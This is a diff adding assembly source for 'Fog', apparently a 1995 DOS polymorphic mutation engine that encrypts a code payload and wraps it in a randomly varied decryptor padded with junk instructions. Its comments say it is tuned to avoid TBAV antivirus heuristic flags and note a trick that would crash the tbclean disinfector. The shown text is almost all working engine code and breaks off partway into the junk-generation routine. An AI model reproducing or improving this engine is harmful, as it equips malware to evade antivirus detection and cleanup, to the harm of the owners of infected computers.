@@ -1,0 +1,1060 @@
+;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+ title   Fog - the funky opcode generator
+ subttl  1.0.01 Released June 1995
+
+;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
+
+
+
+
+ .radix 16
+ ideal
+ segment code word
+ assume cs : code, ds : code, es : code, ss : code
+
+ public fog_init, fog, rnd
+
+ fogsize = end_fog
+
+ include "switches.inc"
+
+
+
+
+
+
+
+
+
+; internal switches - used only by fog:
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+ sw_nojmps      equ 00000001b
+ sw_displ       equ 00000010b
+ sw_directn     equ 00000100b
+ sw_int4        equ 00001000b                   ; unused
+ sw_int5        equ 00010000b                   ; unused
+ sw_int6        equ 00100000b                   ; unused
+ sw_int7        equ 01000000b                   ; unused
+ sw_int8        equ 10000000b                   ; unused
+
+
+
+; internal data structure
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+ struc datstruc
+    code_buffer dw 0                            ;code buffer
+    code_ip     dw 0                            ;code offset
+    code_length dw 0                            ;code length
+    dec_offset  dw 0                            ;offset in decryptor
+    encr_key    dw 0                            ;encryption key
+    gb_switches db 0                            ;switches
+    dh_switches db 0                            ;
+    gn_switches db 0                            ;
+    in_switches db 0                            ;
+    count_reg   db 0                            ;counter reg
+    base_reg    db 0                            ;base reg
+    key_reg     db 0                            ;key reg
+    rolls       db 0                            ;rolls on key 
+    keypos      dw 0                            ;pos in decryptor of the key
+    lastjmp     dw 0                            ;last unupdated jmp
+    displ       dw 0                            ;displacement
+
+
+;  What to put in ah on dos calls.
+;  None of these change any registers except AX.
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+    i_table     db 61, 1dh, 1eh, 20, 2eh, 45, 4dh
+
+
+;  One byte junk instruction table.
+;  It is possible to expand the engine by replacing the number 1fh
+;  in the random function of flow_controller by 3fh (or 7f, ff),
+;  increasing the indexing capability. Then you can add as many new
+;  junk generating routines as you find appropriate. This will add lots
+;  to the size of the engine, because you will have to add many new
+;  one-byte intructions and junk routines to fill the increased index space.
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+    onebytes    db 90    ;nop    This nop could be replaced
+		db 90    ;nop    as could this (possibly 0d6h?)
+		db 40    ;inc ax
+		db 48    ;dec ax
+		db 90    ;nop
+		db 98    ;cbw
+		db 9bh   ;wait
+		db 9eh   ;sahf
+		db 9fh   ;lahf
+    break       db 0cch  ;int 3
+		db 0ech  ;in al, dx
+		db 0edh  ;in ax, dx
+		db 0d7h  ;xlat
+		db 0f5h  ;cmc
+		db 0fch  ;cld
+		db 0fdh  ;std
+		db 0f8h  ;clc
+		db 0f9h  ;stc
+ ends datstruc
+; NB: The one byte instructions of aaa, aas, daa, das generate tbav @ flags
+; and have not been included in the one-byte table.
+; The d6 instruction, which is undefined in the 80X86 instruction set, could've
+; been used, as it seems to have no effect. However, it generates tbav ! flags,
+; which together with the G flag causes tbav alert. If you should decide to use
+; it, it would effectively kill any tbclean attempt - making tbclean croak with
+; an "invalid opcode" message.
+
+
+; Register encoding definitions for internal use
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+    rax         equ 00
+    rbx         equ 03
+    rcx         equ 01
+    rdx         equ 02
+    rsp         equ 04
+    rbp         equ 05
+    rsi         equ 06
+    rdi         equ 07
+
+    cryptinstr  equ 0fh                         ;Amount of crypt instructions
+						;to use
+    cryptobuf   equ ( cryptinstr ) * 3          ;crypto buffer
+
+    buffer_offs equ ( offset buffer - offset i_data )
+						;absolute offset to buffer
+    roll_offs   equ ( offset rollit - offset i_data ) + 1
+						;absolute offset to roll instr.
+						;when decrementing decryptor,
+						;the rol has to be changed into
+						;a ror
+    id          equ ( datstruc ptr bx )         ;just simplifying things some
+
+
+
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+begin_fog:
+;  FOG label
+
+ db '[Fog 1.0]'
+
+
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;                 MAIN PUBLIC ROUTINES
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; Initialise fog
+ proc fog_init
+    push ax bx ds
+    call set_base                               ;set ds:bx -> cs:i_data
+
+    mov      [ word id . gb_switches    ], ax   ;ÄÄÄÄÄÄÄ¿
+    mov      [ word id . gn_switches    ], cx   ;       ³
+    mov      [ id . code_buffer         ], dx   ;       ÃÄ fill values into
+    mov      [ id . code_length         ], si   ;       ³  internal data area
+    mov      [ id . code_ip             ], di   ;       ³
+    mov      [ id . break               ], 0cch ;ÄÄÄÄÄÄÄÙ
+
+
+    test     [ id . gn_switches         ], sw_r_garb ;ÄÄ¿
+    jz   @@1                                    ;       ³       
+    call rnd_07                                 ;       ³
+    mov  al, 0ffh                               ;       ÃÄ randomise junk
+    shr  al, cl                                 ;       ³
+    mov      [ id . gb_switches         ], al   ;       ³
+    @@1:                                        ;ÄÄÄÄÄÄÄÙ
+
+
+    test     [ id . gn_switches         ], sw_r_host ;ÄÄ¿
+    jz   @@2                                    ;       ³
+    call rnd_ff                                 ;       ÃÄ randomise hostility
+    mov      [ id . dh_switches         ], al   ;       ³
+    @@2:                                        ;ÄÄÄÄÄÄÄÙ
+
+    call max_codesize                           ; return max mem used
+
+    pop ds bx ax
+    ret                                         ;return: fog data area filled with
+						;necessary constants
+ endp fog_init
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;  --==<!!!             MAIN LOOP               !!!>==--
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; Encrypt code and add decryptor, store all in es:0 ->
+ proc fog
+    push ax bx si di bp                         ;save regs
+    call set_base                               ;set bx at data struc
+
+    mov      [ id . dec_offset          ], bp   ;set offset to use in decryptor
+
+    restart:
+
+    mov  al, 90                                 ;ÄÄÄÄÄÄÄ¿
+    mov  cx, cryptobuf                          ;       ³
+    mov  si, bx                                 ;       ³
+    nextnop:                                    ;       ÃÄ init crypto buffer
+    mov       [ si + buffer_offs        ], al   ;       ³
+    inc  si                                     ;       ³
+    loop nextnop                                ;ÄÄÄÄÄÄÄÙ       
+
+
+    test     [ id . dh_switches         ], sw_int3 ;ÄÄÄÄ¿
+    jnz   genint3                               ;       ÃÄ don't use int 3's
+    mov      [ id . break               ], al   ;       ³  replace CC with 90   
+    genint3:                                    ;ÄÄÄÄÄÄÄÙ
+
+						;ÄÄÄÄÄÄÄ¿
+    call rnd_ax                                 ;       ³
+    add      [ id . encr_key            ], ax   ;       ÃÄ randomise key
+    rol  ax, cl                                 ;       ³
+    add      [ id . encr_key            ], ax   ;ÄÄÄÄÄÄÄÙ
+
+
+    and      [ id . in_switches         ], not sw_directn ;
+    mov      [ byte bx + roll_offs      ], 0c2h ;       ³
+    call rnd_z                                  ;       ³
+    jz   up                                     ;       ÃÄ randomise up/down
+    or       [ id . in_switches         ], sw_directn ; ³  if down, invert
+    mov      [ byte bx + roll_offs      ], 0cah ;       ³  rol -> ror
+    up:                                         ;ÄÄÄÄÄÄÄÙ
+
+
+    xor  di, di                                 ;set buffer offset = 0
+
+
+    and      [ id . gn_switches         ], not sw_displ;¿
+    mov  ax, di                                 ;       ³
+    jz   n_disp                                 ;       ³
+    or       [ id . in_switches         ], sw_displ;    ÃÄ randomise displ.
+    call rnd_ax                                 ;       ³
+    n_disp:                                     ;       ³
+    mov      [ id . displ               ], ax   ;ÄÄÄÄÄÄÄÙ
+
+
+    test     [ id . dh_switches         ], not sw_debug;¿
+    jnz   nodebug                               ;       ÃÄ if debug,
+    mov      [ id . encr_key            ], di   ;       ³  zero key     
+    nodebug:                                    ;ÄÄÄÄÄÄÄÙ
+
+
+    mov      [ word id . count_reg      ], di   ;ÄÄÄÄÄÄÄ¿
+    mov      [ word id . key_reg        ], di   ;       ÃÄ zero regs
+    mov      [ word id . keypos         ], di   ;ÄÄÄÄÄÄÄÙ
+
+    call reg_init_strategy                      ;ÄÄÄÄÄÄÄ¿
+    call reg_init_strategy                      ;       ÃÄ determine regs
+    call reg_init_strategy                      ;ÄÄÄÄÄÄÄÙ
+
+    push bp
+    mov  bp, di                                 ;store loopback offset
+
+						; below : crypto instruction 
+						; generation loop
+    mov  cl, cryptinstr                         ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+    call rnd                                    ;                       ³
+    mov  si, cryptobuf                          ;                       ³
+    new_func:                                   ;                       ³
+    push cx                                     ;                       ³
+    call junk                                   ; junk                  ³
+    dec  si                                     ;                       ³
+    dec  si                                     ;                       ³
+						;                       ³
+    call rnd_03                                 ;                       ³
+						;                       ³
+    loop addfunc                                ;ÄÄÄÄÄÄÄ¿               ³
+    subfunc:                                    ;       ÃÄ sub          ³
+    mov  dx, 2903h                              ;       ³               ³
+    addfunc:                                    ;ÄÄÄÄÄÄÄ´               ³
+    loop xorfunc                                ;       ÃÄ add          ³
+    mov  dx, 012bh                              ;       ³               ³
+    xorfunc:                                    ;ÄÄÄÄÄÄÄ´               ³
+    loop det_func                               ;       ÃÄ xor          ³
+    mov  dx, 3133h                              ;       ³               ³
+    det_func:                                   ;ÄÄÄÄÄÄÄÙ               ³
+						;                       ³
+    call getseg                                 ;cs:/ds:/es:/ss:        ³
+						;                       ³
+    call rnd_z                                  ;                       ³
+    jnz  immediate_keys                         ;                       ³
+						;                       ³
+						;ÄÄÄÄÄÄÄ¿               ³
+    mov  ah, dh                                 ;       ³               ³
+    stosw                                       ;       ³               ³
+    mov  al, [ id . key_reg             ]       ;       ³               ³
+    mov  cl, 3                                  ;       ÃÄ register     ³
+    shl  al, cl                                 ;       ³  keyed        ³
+    call xlatreg                                ;       ³               ³
+    mov  dh, 0c2h                               ;       ³               ³
+    mov      [ bx + si + buffer_offs    ], dx   ;       ³               ³
+    jmp  short @@1                              ;ÄÄÄÄÄÄÄ´               ³
+						;       ³               ³
+						;       ³               ³
+    immediate_keys:                             ;       ³               ³
+    dec  si                                     ;       ³               ³
+    and  dh, 0feh                               ;       ³               ³
+    add  dl, 02                                 ;       ³               ³
+    mov  ah, 81                                 ;       ³               ³
+    stosw                                       ;       ÃÄ immediate    ³
+    mov  al, dh                                 ;       ³  keyed        ³
+    call xlatreg                                ;       ³               ³
+    call rnd_ax                                 ;       ³               ³
+    test     [ id . dh_switches         ], not sw_debug;³               ³
+    jnz   n_debug                               ;       ³               ³
+    xor  ax, ax                                 ;       ³               ³
+    n_debug:                                    ;       ³               ³
+    stosw                                       ;       ³               ³
+    mov      [ bx + si + buffer_offs    ], dl   ;       ³               ³
+    mov      [ bx + si + buffer_offs + 1], ax   ;       ³               ³
+    @@1:                                        ;ÄÄÄÄÄÄÄÙ               ³
+    pop cx                                      ;                       ³
+    loop new_func                               ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ                       Ù
+
+    call junk                                   ;add junk
+
+    call rnd_z                                  ;ÄÄÄÄÄÄÄ¿
+    jz   no_roll                                ;       ³
+    call rnd_07                                 ;       ³
+    mov      [ id . rolls               ], cl   ;       ³
+    mov  ax, 0c0d1h                             ;       ³
+    or   ah, [ id . key_reg             ]       ;       ÃÄ randomise and
+    new_roll:                                   ;       ³  add rol's
+    stosw                                       ;       ³
+    call junk                                   ; junk  ³
+    loop new_roll                               ;       ³
+    no_roll:                                    ;ÄÄÄÄÄÄÄÙ
+
+
+    call computepos                             ;increment base position
+
+    call junk                                   ;add junk
+
+    lea  ax, [ bx + (offset jmps_finished - offset i_data) ]
+    push ax                                     ;for people who might not
+						;understand what I do here:
+						;I push the address of
+						;jmps_finished onto the stack,
+						;so that following ret's
+						;will bring me there.
+
+
+
+    mov  al, [ id . count_reg           ]
+    or   al, 48                                 ;dec count 
+    stosb
+
+
+    call rnd_03                                 ;randomise
+    lea  dx, [ bp - 1                   ]       ;backward jump strategies.
+
+    sub  dx, di
+    cmp  dx, 0ff80h                             ;can't use short jmps
+    jbe  jmp_strategy3                          ;if decryptor too long
+
+    loop jmp_strategy3
+    cmp      [ id . count_reg           ], rcx  ; is CX count reg?
+    jnz  jmp_strategy2
+    call rnd_z                                  ; if so, we might use loop
+    jz   jmp_strategy2                          ; but only randomly so
+
+    jmp_strategy1:                              ;ÄÄÄÄÄÄÄ¿
+    dec  di                                     ;       ³
+    mov  ah, dl                                 ;       ÃÄ loop back
+    mov  al, 0e2                                ;       ³
+    ret                                         ;       ³
+						;ÄÄÄÄÄÄÄ´
+    jmp_strategy2:                              ;       ³
+    dec  dx                                     ;       ³
+    mov  ah, dl                                 ;       ÃÄ jnz back
+    mov  al, 75                                 ;       ³       
+    ret                                         ;       ³
+						;ÄÄÄÄÄÄÄ´
+    jmp_strategy3:                              ;       ³
+    loop jmp_strategy4                          ;       ³    
+    longjmp:                                    ;       ³
+    mov  ax, 0374                               ;       ³
+    stosw                                       ;       ÃÄ jz $+3
+    mov  al, 0e9                                ;       ³  jmp back
+    stosb                                       ;       ³
+    lea  ax, [ bp - 2                   ]       ;       ³
+    sub  ax, di                                 ;       ³
+    ret                                         ;       ³
+						;ÄÄÄÄÄÄÄ´
+    jmp_strategy4:                              ;       ³
+    mov  ax, 0574                               ;       ³
+    stosw                                       ;       ³
+    call find_reg                               ;       ³
+    push ax                                     ;       ³
+    or   al, 0b8h                               ;       ÃÄ jz $+5
+    stosb                                       ;       ³  mov reg, offs back   
+    mov  ax, bp                                 ;       ³  push reg 
+    add  ax, [ id . dec_offset          ]       ;       ³  ret
+    stosw                                       ;       ³
+    pop  ax                                     ;       ³
+    or   ax, 0c350                              ;       ³
+    ret                                         ;ÄÄÄÄÄÄÄÙ
+
+    jmps_finished:
+    stosw
+
+    call junk                                   ;add junk
+
+
+    test     [ id . in_switches         ], sw_directn ;Ä¿
+    jz   n_prefetch_buf                         ;       ³
+    mov  ax, 00ebh                              ;       ÃÄ clear prefetch queue
+    stosw                                       ;       ³
+    n_prefetch_buf:                             ;ÄÄÄÄÄÄÄÙ
+
+    mov  ax, 0e990
+    mov  dx, [ id . encr_key            ]       ;put encryption key in dx
+    mov  bp, di                                 ;ÄÄÄÄÄÄÄ¿
+    call scramble_word                          ;       ³
+    stosw                                       ;       ÃÄ crypt jmp to
+    mov  ax, [ id . code_ip             ]       ;       ³  code offset  
+    call scramble_word                          ;       ³
+    stosw                                       ;ÄÄÄÄÄÄÄÙ
+
+    mov  ax, [ id . code_length         ]       ;ÄÄÄÄÄÄÄ¿
+    shr  ax, 1                                  ;       ÃÄ div code length      
+    inc  ax                                     ;       ³  by key length
+    mov  cx, ax                                 ;ÄÄÄÄÄÄÄÙ
+
+    mov  si, [ id . code_buffer         ]       ;where to get data to crypt
+
+    newword:                                    ;ÄÄÄÄÄÄÄ¿
+    lodsw                                       ;       ³
+    call scramble_word                          ;       ÃÄ encrypt
+    stosw                                       ;       ³
+    loop newword                                ;ÄÄÄÄÄÄÄÙ
+
+    test     [ id . in_switches         ], sw_directn ;Ä¿
+    jz   n_adjust                               ;       ³
+    lea  bp, [ di - 2                   ]       ;       ³
+    mov  si, [ id . keypos              ]       ;       ÃÄ if down decryptor
+    mov  cl, [ id . rolls               ]       ;       ³  encr. key has to be
+    rol  dx, cl                                 ;       ³  adjusted because
+    mov      [ es : si                  ], dx   ;       ³  of the rol's
+    n_adjust:                                   ;ÄÄÄÄÄÄÄÙ
+
+
+    pop  si
+    add  bp, [ id . dec_offset          ]
+    add      [ es : si                  ], bp   ;adjust start of decrypt
+
+
+    test     [ id . dh_switches         ], not sw_debug;¿
+    jz   all_ok                                 ;       ³
+    push ax                                     ;       ³
+    call scramble_word                          ;       ³
+    pop  cx                                     ;       ÃÄ if not debug, test
+    cmp  ax, cx                                 ;       ³  if decryptor
+    jnz  all_ok                                 ;       ³  really encrypts
+    jmp  restart                                ;       ³  if not, restart
+    all_ok:                                     ;ÄÄÄÄÄÄÄÙ
+
+    test     [ id . gn_switches         ], sw_const_s;ÄÄ¿
+    jz   nostatic                               ;       ³
+    push ax                                     ;       ³
+    call max_codesize                           ;       ³
+    pop  ax                                     ;       ÃÄ if constant size,
+    sub  cx, di                                 ;       ³  pad up to max
+    jbe  nostatic                               ;       ³  codesize
+    rep  stosb                                  ;       ³
+    nostatic:                                   ;ÄÄÄÄÄÄÄÙ
+
+    mov  cx, di
+    add  cx, [ id . dec_offset          ]
+    neg  cx
+
+    test     [ id . gn_switches         ], sw_align256;Ä¿ 
+    jz   test16                                 ;       ÃÄ 256 byte alignment?
+    and  cx, 0ffh                               ;       ³
+    jnz  pad                                    ;ÄÄÄÄÄÄÄÙ
+
+    test16:                                     ;ÄÄÄÄÄÄÄ¿
+    test     [ id . gn_switches         ], sw_align16   ³
+    jz   nopad                                  ;       ÃÄ 16 byte alignment?
+    and  cx, 0f                                 ;       ³
+    jz   nopad                                  ;ÄÄÄÄÄÄÄÙ
+    pad:
+    rep  stosb                                  ;do the padding
+    nopad:
+
+    mov  cx, di                                 ;set cx    = bytes crypted
+
+    push es                                     ;set ds:dx = crypted code
+    pop  ds
+    xor  dx, dx
+
+    pop  bp di si bx ax                         ;restore regs
+    ret
+    ;RETURN: Encrypted and mutated code in ES:DI = DS:DX = DS:0
+    ;        Number of bytes            in CX
+ endp fog
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; Get random (almost) number from timer
+ proc rnd
+    push bx
+    mov  bx, ax
+    mov  bh, bl
+    mov  ch, 0
+    in   ax, 40h
+    and  ax, cx
+    push cx
+    xchg ax, cx
+    in   ax, 40h
+    add  ax, bx
+    ror  ax, cl
+    pop  cx
+    and  ax, cx
+    jnz  @@1
+    inc  ax
+    @@1:
+    pop  bx
+    mov  cl, al
+    ret                                         ;return: AL/CL = rnd (1..CL)
+ endp rnd
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;              ENCRYPTOR/DECRYPTOR LOGISTICS
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; Set base (bx) at internal data struc
+ proc set_base
+    call myip
+    myip:
+    pop  bx
+    sub  bx, myip - i_data
+    push cs
+    pop  ds
+    ret                                         ;return: BX pointing at i_data
+ endp set_base
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; Check that requested register (in al) is unused
+ proc reg_used
+    cmp  al, [ id . key_reg             ]       ;key register
+    jz   @@1
+    cmp  al, [ id . count_reg           ]       ;counter register
+    jz   @@1
+    cmp  al, [ id . base_reg            ]       ;base register
+    jz   @@1
+    cmp  al, rsp                                ;SP, not to be used
+    @@1:
+    ret                                         ;return : Z if reg is used
+ endp reg_used
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; Find unused register
+ proc find_reg
+    call rnd_07
+    call reg_used
+    jz   find_reg
+    mov  dl, al
+    ret                                         ;return: unused register in AL and DL
+ endp find_reg
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; Rand 1-3
+ proc rnd_03
+    mov  cl, 03h
+    call rnd
+    ret                                         ;return: AL/CL = rnd (1..3)
+ endp rnd_03
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; Rand 1-7
+ proc rnd_07
+    mov  cl, 07h
+    call rnd
+    ret                                         ;return: AL/CL = rnd (1..7)
+ endp rnd_07
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; Rand 1-255
+ proc rnd_ff
+    mov  cl, 0ffh
+    call rnd
+    ret                                         ;return: AL/CL = rnd (1..255)
+ endp rnd_ff
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; A random Yes/No function
+ proc rnd_z
+    push ax cx
+    call rnd_ff
+    test al, 01h
+    pop  cx ax
+    ret                                         ;return: rnd Z/NZ
+ endp rnd_z
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; Translate register values into valid instruction
+ proc xlatreg
+    ?si:
+    or   al, 04
+    cmp      [ id . base_reg            ], rsi
+    jz   @@2
+    ?di:
+    or   al, 05
+    cmp      [ id . base_reg            ], rdi
+    jz   @@2
+    or   al, 07
+    @@2:
+    test     [ id . in_switches         ], sw_displ
+    jz   @@3                                    ;displacement?
+    or   al, 80h
+    stosb
+    mov  ax, [ id . displ               ]
+    stosw
+    ret
+    @@3:
+    stosb
+    ret                                         ;return: Valid instruction
+						;in decryptor
+ endp xlatreg
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; Encrypt word in ax
+ proc scramble_word
+    push cx
+    buffer:
+    db   cryptobuf dup (90)
+    mov  cl, [ id . rolls               ]
+    rollit:
+    rol  dx, cl
+    pop  cx
+    ret                                         ;return: AX crypted by
+						;whatever. Fog modifies
+						;itself randomly here, and
+						;creates mundo
+						;different encryptors.
+ endp scramble_word
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; Position updating strategies
+ proc computepos
+    call rnd_z
+    jz   @@3
+    mov  al, 83
+    stosb
+    call rnd_z
+    mov  ax, 02c0                               ;strategy 1/2 : add reg, 2/-2
+    jz   @@1
+    mov  ax, 0fee8                              ;strategy 3/4 : sub reg, 2/-2
+    @@1:
+    test     [ id . in_switches         ], sw_directn
+    jz   @@2
+    neg  ah                                     ;decrementing decryptor
+    @@2:                                        ;incrementing decryptor
+    or   al, [ id . base_reg            ]
+    sword:
+    stosw
+    ret
+
+    @@3:
+    mov  al, 40                                 ;strategy 5 : inc reg inc reg
+    test     [ id . in_switches         ], sw_directn
+    jz   @@4
+    or   al, 08                                 ;strategy 6 : dec reg dec reg
+    @@4:
+    or   al, [ id . base_reg            ]
+    stosb                                       ;add pos instr
+    call junk                                   ;add junk
+    sbyte:
+    stosb                                       ;add pos instr
+    ret                                         ;
+   ;return: Updates the base register in the decryptor
+ endp computepos
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; Get segment override prefix
+ proc getseg
+    test     [ id . gn_switches         ], sw_exefile
+    jz    use_all
+    mov   al, 2eh
+    ret
+    use_all:
+    call  rnd_ff
+    and   al, 3eh
+    or    al, 26h
+    ret
+    ;return : random 2eh/3eh/26h/36h: (CS:/DS:/ES:/SS:) in AL
+    ;if EXE only CS: will be returned
+ endp getseg
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; Compute maximum code length
+ proc max_codesize
+    mov  al, [ id . gb_switches         ]
+    xor  ah, ah
+    mov  cx, ((0dh+cryptinstr)*3)/2             ;garb. calls times 1.5 bytes avg
+    mul  cx                                     ;times max no. of junk instr.
+    add  ax, 9 + (cryptinstr*7) + 7*2 + 3 + 8 + 2 + 4
+    add  ax, [ id . code_length         ]
+    xchg ax, cx
+    ret                                         ;return: max encrypted size in CX
+ endp max_codesize
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+; Pick regs to use in vital instructions
+ proc reg_init_strategy
+    call junk
+    reg_init_strategy_:
+    call find_reg
+    call rnd_03
+    loop cntfunc
+    cmp      [ id . base_reg            ], ch
+    jnz  cntfunc_
+    posfunc:                                    ;can only use bx, si or di
+    mov  al, dl
+    cmp  al, rbx
+    jz   regok
+    cmp  al, rsi
+    jz   regok
+    cmp  al, rdi
+    jz   regok
+    call find_reg
+    jmp  short posfunc
+    regok:
+
+    mov      [ id . base_reg            ], al
+    or   al, 0b8
+    stosb
+    mov  bp, di
+    xor  ax, ax
+    sub  ax, [ id . displ               ]
+    stosw
+    ret
+
+    cntfunc:
+    loop keyfunc
+    cntfunc_:
+    cmp      [ id . count_reg           ], ch
+    jnz  keyfunc
+    mov  al, dl
+    mov      [ id . count_reg           ], al
+    or   al, 0b8
+    stosb
+    mov  ax, [ id . code_length         ]
+    shr  ax, 1
+    add  ax, 3
+    stosw
+    ret
+
+    keyfunc:
+    cmp      [ id . key_reg             ], ch
+    jnz  reg_init_strategy_
+    mov  al, dl
+    mov      [ id . key_reg             ], al
+    or   al, 0b8
+    stosb
+    mov  ax, [ id . encr_key            ]
+    mov      [ id . keypos              ], di
+    stosw
+    ret
+    ;return: random register chosen and put in base_reg, count_reg or key_reg
+ endp reg_init_strategy
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;               JUNK ROUTINE
+;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;   017 : Flow controller - Fork junk code generation in different directions
+; Model:        1. Get random no. in CX
+;               2. loop r2
